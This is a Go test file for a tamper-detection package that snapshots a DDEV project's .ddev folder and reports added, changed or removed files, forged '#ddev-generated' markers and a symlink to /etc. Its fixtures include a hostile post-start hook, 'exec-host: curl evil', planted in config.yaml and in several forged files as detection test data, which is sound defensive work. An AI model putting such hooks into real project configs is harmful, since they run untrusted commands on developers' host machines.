package integrity

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, root, rel, content string) {
	t.Helper()
	p := filepath.Join(root, ".ddev", rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestSnapshotAndDiff(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	write(t, root, "commands/web/foo", "#!/bin/bash\n")
	write(t, root, ".ddev-docker-compose-full.yaml", "generated\n")
	write(t, root, "traefik/config/demo.yaml", "#ddev-generated\nstuff\n")
	write(t, root, "db_snapshots/x.gz", "data")

	approved, err := Snapshot(root)
	if err != nil {
		t.Fatal(err)
	}
	if len(approved) != 2 {
		t.Fatalf("expected config.yaml and commands/web/foo only, got %v", approved)
	}

	// Generated and data files may change freely.
	write(t, root, ".ddev-docker-compose-full.yaml", "regenerated\n")
	write(t, root, "traefik/config/demo.yaml", "#ddev-generated\nother\n")
	write(t, root, "db_snapshots/y.gz", "data")
	cur, _ := Snapshot(root)
	if d := Diff(approved, cur); len(d) != 0 {
		t.Fatalf("unexpected diff %v", d)
	}

	write(t, root, "config.yaml", "name: demo\nhooks:\n  post-start:\n    - exec-host: curl evil\n")
	write(t, root, "docker-compose.evil.yaml", "services: {}\n")
	os.Remove(filepath.Join(root, ".ddev", "commands", "web", "foo"))
	cur, _ = Snapshot(root)
	d := Diff(approved, cur)
	want := []string{"added: .ddev/docker-compose.evil.yaml", "changed: .ddev/config.yaml", "removed: .ddev/commands/web/foo"}
	if len(d) != 3 || d[0] != want[0] || d[1] != want[1] || d[2] != want[2] {
		t.Fatalf("diff = %v, want %v", d, want)
	}
}

func TestForgedMarkerIsFingerprinted(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	a, _ := Snapshot(root)
	for _, f := range []string{
		"config.evil.yaml",
		"docker-compose.evil.yaml",
		"commands/host/evil",
		"commands/web/README.evil", // README in a container command dir is fine ...
		"mutagen/mutagen.yml",
		".env.web",
	} {
		write(t, root, f, "#ddev-generated\nhooks: {post-start: [{exec-host: curl evil}]}\n")
	}
	b, _ := Snapshot(root)
	d := Diff(a, b)
	// ... so only five of the six files count.
	if len(d) != 5 {
		t.Fatalf("forged #ddev-generated files must be fingerprinted, diff = %v", d)
	}
	write(t, root, "addon-metadata/ddev-bridge/manifest.yaml", "x")
	if c, _ := Snapshot(root); len(Diff(b, c)) != 0 {
		t.Fatal("addon-metadata must be ignored")
	}
}

func TestSymlinkRecorded(t *testing.T) {
	root := t.TempDir()
	write(t, root, "config.yaml", "name: demo\n")
	a, _ := Snapshot(root)
	os.Symlink("/etc", filepath.Join(root, ".ddev", "homeadditions"))
	b, _ := Snapshot(root)
	if d := Diff(a, b); len(d) != 1 {
		t.Fatalf("symlink not detected: %v", d)
	}
}
